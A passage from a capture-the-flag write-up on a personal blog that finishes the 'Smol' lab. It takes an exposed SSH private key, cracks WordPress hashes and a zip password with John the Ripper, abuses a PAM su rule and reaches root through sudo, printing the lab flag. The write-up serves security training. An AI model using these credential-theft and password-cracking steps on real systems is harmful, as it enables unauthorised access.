+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>diego<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>diego<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>diego<span class="o">)</span>,1005<span class="o">(</span>internal<span class="o">)</span>
+</span></span><span class="line"><span class="cl">diego@smol:~$ ls -lah /home
+</span></span><span class="line"><span class="cl">total 24K
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">6</span> root  root     4.0K Aug <span class="m">16</span>  <span class="m">2023</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root  root     4.0K Mar <span class="m">29</span>  <span class="m">2024</span> ..
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">2</span> diego internal 4.0K Aug <span class="m">18</span>  <span class="m">2023</span> diego
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">2</span> gege  internal 4.0K Aug <span class="m">18</span>  <span class="m">2023</span> gege
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">5</span> think internal 4.0K Jan <span class="m">12</span>  <span class="m">2024</span> think
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">2</span> xavi  internal 4.0K Aug <span class="m">18</span>  <span class="m">2023</span> xavi
+</span></span></code></pre></div><p>We got some interesting hits.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ls -lahR /home/
+</span></span><span class="line"><span class="cl">/home/gege:
+</span></span><span class="line"><span class="cl">-rwxr-x--- <span class="m">1</span> root gege      31M Aug <span class="m">16</span>  <span class="m">2023</span> wordpress.old.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/home/think:
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> think think    4.0K Jun <span class="m">21</span>  <span class="m">2023</span> .ssh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/home/think/.ssh:
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> think think     <span class="m">572</span> Jun <span class="m">21</span>  <span class="m">2023</span> authorized_keys
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> think think    2.6K Jun <span class="m">21</span>  <span class="m">2023</span> id_rsa
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> think think     <span class="m">572</span> Jun <span class="m">21</span>  <span class="m">2023</span> id_rsa.pub
+</span></span></code></pre></div><p>Here we got private key to login as user <code>thick</code>. Saving <code>id_rsa</code> file as <code>think_id_rsa</code> in local system.</p>
+<p>Got <code>shell as think</code> by using pivate key to login with ssh.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh think@www.smol.thm -i think_id_rsa 
+</span></span><span class="line"><span class="cl">think@smol:~$ 
+</span></span></code></pre></div><h3 id="shell-as-gege">Shell as gege</h3>
+<p>While looking for privilege escalation factors, got an interesting backup file <code>wp_backup.sql</code>. It contains the password hashes of all users. <br>
+[Note: This hash is different from the hash we got from sql database.]</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">think@smol:~$ ls -lah /opt
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root 286K Mar <span class="m">29</span>  <span class="m">2024</span> wp_backup.sql
+</span></span><span class="line"><span class="cl">think@smol:~$ grep -i <span class="se">\$</span>p /opt/wp_backup.sql 
+</span></span><span class="line"><span class="cl">INSERT INTO <span class="sb">`</span>wp_users<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">&#39;admin&#39;</span>,<span class="s1">&#39;$P$Bvi8BHb84pjY/Kw0RWsOXUXsQ1aACL1&#39;</span>,<span class="s1">&#39;admin&#39;</span>,<span class="s1">&#39;admin@smol.thm&#39;</span>,<span class="s1">&#39;http://192.168.204.139&#39;</span>,<span class="s1">&#39;2023-08-16 06:58:30&#39;</span>,<span class="s1">&#39;&#39;</span>,0,<span class="s1">&#39;admin&#39;</span><span class="o">)</span>,<span class="o">(</span>2,<span class="s1">&#39;wpuser&#39;</span>,<span class="s1">&#39;$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.&#39;</span>,<span class="s1">&#39;wp&#39;</span>,<span class="s1">&#39;wp@smol.thm&#39;</span>,<span class="s1">&#39;http://smol.thm&#39;</span>,<span class="s1">&#39;2023-08-16 11:04:07&#39;</span>,<span class="s1">&#39;&#39;</span>,0,<span class="s1">&#39;wordpress user&#39;</span><span class="o">)</span>,<span class="o">(</span>3,<span class="s1">&#39;think&#39;</span>,<span class="s1">&#39;$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/&#39;</span>,<span class="s1">&#39;think&#39;</span>,<span class="s1">&#39;josemlwdf@smol.thm&#39;</span>,<span class="s1">&#39;http://smol.thm&#39;</span>,<span class="s1">&#39;2023-08-16 15:01:02&#39;</span>,<span class="s1">&#39;&#39;</span>,0,<span class="s1">&#39;Jose Mario Llado Marti&#39;</span><span class="o">)</span>,<span class="o">(</span>4,<span class="s1">&#39;gege&#39;</span>,<span class="s1">&#39;$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1&#39;</span>,<span class="s1">&#39;gege&#39;</span>,<span class="s1">&#39;gege@smol.thm&#39;</span>,<span class="s1">&#39;http://smol.thm&#39;</span>,<span class="s1">&#39;2023-08-17 20:18:50&#39;</span>,<span class="s1">&#39;&#39;</span>,0,<span class="s1">&#39;gege&#39;</span><span class="o">)</span>,<span class="o">(</span>5,<span class="s1">&#39;diego&#39;</span>,<span class="s1">&#39;$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1&#39;</span>,<span class="s1">&#39;diego&#39;</span>,<span class="s1">&#39;diego@smol.thm&#39;</span>,<span class="s1">&#39;http://smol.thm&#39;</span>,<span class="s1">&#39;2023-08-17 20:19:15&#39;</span>,<span class="s1">&#39;&#39;</span>,0,<span class="s1">&#39;diego&#39;</span><span class="o">)</span>,<span class="o">(</span>6,<span class="s1">&#39;xavi&#39;</span>,<span class="s1">&#39;$P$BvcalhsCfVILp2SgttADny40mqJZCN/&#39;</span>,<span class="s1">&#39;xavi&#39;</span>,<span class="s1">&#39;xavi@smol.thm&#39;</span>,<span class="s1">&#39;http://smol.thm&#39;</span>,<span class="s1">&#39;2023-08-17 20:20:01&#39;</span>,<span class="s1">&#39;&#39;</span>,0,<span class="s1">&#39;xavi&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span></code></pre></div><p>Lets create another file unshadow1.txt to bruteforce for passwords.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat unshadow1.txt
+</span></span><span class="line"><span class="cl">admin:<span class="nv">$P$Bvi8BHb84pjY</span>/Kw0RWsOXUXsQ1aACL1
+</span></span><span class="line"><span class="cl">wpuser:<span class="nv">$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1</span>/E.
+</span></span><span class="line"><span class="cl">think:<span class="nv">$P$B0jO</span>/cdGOCZhlAJfPSqV2gVi2pb7Vd/
+</span></span><span class="line"><span class="cl">gege:<span class="nv">$P$BsIY1w5krnhP3WvURMts0</span>/M4FwiG0m1
+</span></span><span class="line"><span class="cl">diego:<span class="nv">$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1</span>
+</span></span><span class="line"><span class="cl">xavi:<span class="nv">$P$BvcalhsCfVILp2SgttADny40mqJZCN</span>/
+</span></span><span class="line"><span class="cl">$ john unshadow1.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+</span></span><span class="line"><span class="cl">hero_gege@hotmail.com <span class="o">(</span>gege<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">Session completed. 
+</span></span></code></pre></div><p>We successfully got password for the user <code>gege</code>.</p>
+<p>Lets switch as user <code>gege</code> using <code>su</code> command.</p>
+<h3 id="etcpamdsu">/etc/pam.d/su</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">think@smol:~$ su gege
+</span></span><span class="line"><span class="cl">gege@smol:/home/think$ 
+</span></span></code></pre></div><p>When trying to switch as <code>gege</code> user, password authentication didn&rsquo;t happened. When searching why password is not required here we got some interesting results in <code>/etc/pam.d/su</code>, there is a configuration to <code>switch as user gege from user thick without password authentication</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gege@smol:~$ cat /etc/pam.d/su <span class="p">|</span> grep auth
+</span></span><span class="line"><span class="cl">auth       sufficient pam_rootok.so
+</span></span><span class="line"><span class="cl">auth  <span class="o">[</span><span class="nv">success</span><span class="o">=</span>ignore <span class="nv">default</span><span class="o">=</span>1<span class="o">]</span> pam_succeed_if.so <span class="nv">user</span> <span class="o">=</span> gege
+</span></span><span class="line"><span class="cl">auth  sufficient                 pam_succeed_if.so use_uid <span class="nv">user</span> <span class="o">=</span> think
+</span></span></code></pre></div><p>We already know that there is a backup file at <code>/home/gege/wordpress.old.zip</code>. Copying that file to local machine and tried to unzip it. But it is password protected.</p>
+<p>Lets try to bruteforce password of the zip file using <code>john</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ zip2john gege_wordpress.old.zip &gt; gege_wordpress.old.hash.txt
+</span></span><span class="line"><span class="cl">$ john gege_wordpress.old.hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">hero_gege@hotmail.com <span class="o">(</span>gege_wordpress.old.zip<span class="o">)</span>     
+</span></span></code></pre></div><p>HAHA, its same password as user gege&rsquo;s password.</p>
+<p>Lets unzip it.</p>
+<p>It contains wordpress back files. So lets look into <code>wp-config.php</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ unzip gege_wordpress.old.zip -d gege_wordpress.old
+</span></span><span class="line"><span class="cl">Archive:  gege_wordpress.old.zip
+</span></span><span class="line"><span class="cl"><span class="o">[</span>gege_wordpress.old.zip<span class="o">]</span> wordpress.old/wp-config.php password: 
+</span></span><span class="line"><span class="cl">$ cat gege_wordpress.old/wordpress.old/wp-config.php
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;wordpress&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database username */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;xavi&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database password */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;P@ssw0rdxavi@&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>Here we got the password of the user xavi. Lets switch to user xavi using <code>su</code>.</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<p>When checking the <code>sudo permession</code> of user xavi, user can run all commands as sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xavi@smol:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> xavi: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> xavi on smol:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User xavi may run the following commands on smol:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">xavi@smol:~$ sudo su
+</span></span><span class="line"><span class="cl">root@smol:/home/xavi$
+</span></span></code></pre></div><p>Here we got out last flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@smol:~$ cat root.txt 
+</span></span><span class="line"><span class="cl">bf89e***************f576214d4e4
+</span></span></code></pre></div><!--flag2{bf89ea3ea01992353aef1f576214d4e4}-->
+<p>We solved the lab.</p>
+<p>Happy Hacking !!! &#x1f60e;</p>
+
+      </article>
+
+      
+      
+
+
+  
+<script type="text/javascript">
+  (function() {
+    const themeToggle = document.querySelector('.darkmode-toggle input');
+    const light = 'light';
+    const dark = 'dark';
+    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    let theme = isDark ? dark : light;
+
+    const s = document.createElement('script');
+    s.type = 'text/javascript';
+    const dataset = {
+        repo: 'cyberjagadeesh\/cyberjagadeesh.github.io',
+        repoId: 'R_kgDOMfA4MA',
+        category: 'General',
+        categoryId: 'DIC_kwDOMfA4MM4ChYzn',
+        mapping: 'url',
+        reactionsEnabled: '1',
+        emitMetadata: '0',
+        theme: theme,
+        lang: 'en',
+    };
+    s.src = 'https://giscus.app/client.js';
+    s.crossorigin = 'anonymous';
+    s.async = true;
+    Object.entries(dataset).forEach(function(a) {
+        return s.dataset[a[0]] = a[1];
+    });
+
+    const curScriptElement = document.currentScript;
+    curScriptElement.parentNode.insertBefore(s, curScriptElement);
+
+    function sendMessage(message) {
+      const iframe = document.querySelector('iframe.giscus-frame');
+      
+      if (!iframe) return;
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+    }
+
+    themeToggle.addEventListener('change', function () {
+      if (this.checked) {
+        theme = dark;
+      } else {
+        theme = light;
+      }
+      sendMessage({
+        setConfig: {
+          theme: theme,
+        }
+      });
+    });
+  })();
+</script>
+  
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+  
+  
+  
+  
+  
+  
+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-27598134b" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2024 - 2025 CyberJagadeesh
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js"></script>
+
+
+
+
+
+</body>
+</html>
